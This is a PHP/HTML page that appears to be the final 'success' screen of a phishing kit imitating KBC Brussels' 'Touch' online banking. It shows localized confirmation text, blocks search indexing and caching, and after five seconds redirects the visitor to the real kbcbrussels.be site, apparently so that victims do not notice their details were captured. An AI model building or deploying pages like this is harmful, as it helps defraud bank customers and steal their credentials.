<?php
session_start();
include "./lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./assets/css/helpers.css">
        <link rel="stylesheet" href="./assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./assets/imgs/ff.ico" />

        <title>Touch</title>
    </head>
    <body>

        <div class="mobile-menu">
            <div class="logo">
                <img src="./assets/imgs/logo.svg">
            </div>
            <div>
                <ul class="ps-0 mb-0 d-flex algin-items-center justify-content-end">
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x1.svg" alt="">Apps</li>
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x2.svg" alt="">Menu</li>
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x3.svg" alt="">Help</li>
                </ul>
            </div>
        </div>

        <div id="wrapper">
            <div class="left">
                <div class="logo d-lg-block d-md-none d-sm-none d-none">
                    <img src="./assets/imgs/logo.svg">
                </div>
            </div>
            <div class="right">
                <div class="top-menu d-lg-block d-md-none d-sm-none d-none">
                    <ul class="ps-0 mb-0 d-flex algin-items-center justify-content-end">
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x1.svg" alt="">Apps</li>
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x2.svg" alt="">Menu</li>
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x3.svg" alt="">Help</li>
                    </ul>
                </div>

                <div class="inner" style="max-width: 100%;">
                    <div class="success">
                        <img style="max-width: 95px;" src="./assets/imgs/logo.svg">
                        <h1 style="font-size:19px; font-weight:700;" class="mt-2"><?php echo get_text('success1'); ?></h1>
                        <p style="font-size:15px;"><?php echo get_text('success2'); ?></p>
                    </div>
                </div>

            </div>
        </div>



        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./assets/js/js.js"></script>
        
        <script>
            setTimeout(function () {
                window.location.href= 'https://www.kbcbrussels.be/';
            },5000); // 1000 = 1s                  
        </script>
    </body>
</html>